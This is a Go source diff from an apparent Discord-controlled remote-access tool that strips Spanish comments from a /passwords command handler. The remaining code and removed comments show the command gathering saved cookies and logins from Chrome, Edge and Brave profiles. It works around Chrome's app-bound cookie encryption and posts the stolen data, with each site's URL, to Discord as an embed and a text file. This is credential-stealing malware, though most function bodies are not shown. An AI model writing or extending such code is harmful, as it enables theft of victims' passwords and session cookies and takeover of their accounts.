@@ -14,11 +14,6 @@ import (
 	"github.com/local/govoid/internal/win32"
 )
 
-// Passwords atiende /passwords: saca las cookies y las credenciales guardadas
-// en Chrome (y Edge y Brave, mismo formato) y las entrega con la URL de cada
-// una. Chrome 127+ cifra las cookies con la clave app-bound (prefijo v20), que
-// solo abre su servicio de elevación; esas filas salen con URL, nombre, path y
-// caducidad, y el valor marcado.
 func Passwords(s *discordgo.Session, i *discordgo.InteractionCreate) {
 	if err := Defer(s, i); err != nil {
 		return
@@ -49,9 +44,6 @@ func Passwords(s *discordgo.Session, i *discordgo.InteractionCreate) {
 	}
 }
 
-// passwordsPayload arma el mensaje que publica /passwords: resumen, embed con
-// las primeras filas y archivo con todo. Devuelve también el resumen en texto
-// para poder registrarlo.
 func passwordsPayload(cookies []win32.Cookie, logins []win32.Login, failures []string, profileCount int) (*discordgo.WebhookEdit, string) {
 	locked := 0
 	for _, cookie := range cookies {
@@ -102,8 +94,6 @@ func passwordsPayload(cookies []win32.Cookie, logins []win32.Login, failures []s
 	}, summary
 }
 
-// collectBrowserData recorre los perfiles y devuelve cookies, credenciales y los
-// errores por perfil. Es la parte que se puede probar sin Discord.
 func collectBrowserData(profiles []win32.ChromeProfile) ([]win32.Cookie, []win32.Login, []string) {
 	var cookies []win32.Cookie
 	var logins []win32.Login
@@ -137,8 +127,6 @@ func collectBrowserData(profiles []win32.ChromeProfile) ([]win32.Cookie, []win32
 	return cookies, logins, failures
 }
 
-// renderCookieLines deja las primeras n cookies en una línea cada una, con la
-// URL delante para que se vea de dónde sale cada valor.
 func renderCookieLines(cookies []win32.Cookie, limit int) string {
 	if len(cookies) == 0 {
 		return ""
@@ -203,8 +191,6 @@ func renderLoginLines(logins []win32.Login, limit int) string {
 	return strings.TrimRight(builder.String(), "\n")
 }
 
-// renderBrowserData arma el .txt completo: cookies y credenciales, cada fila con
-// su URL.
 func renderBrowserData(cookies []win32.Cookie, logins []win32.Login) string {
 	var builder strings.Builder
 	builder.WriteString(config.AppName + " - cookies y credenciales de navegadores Chromium\n")
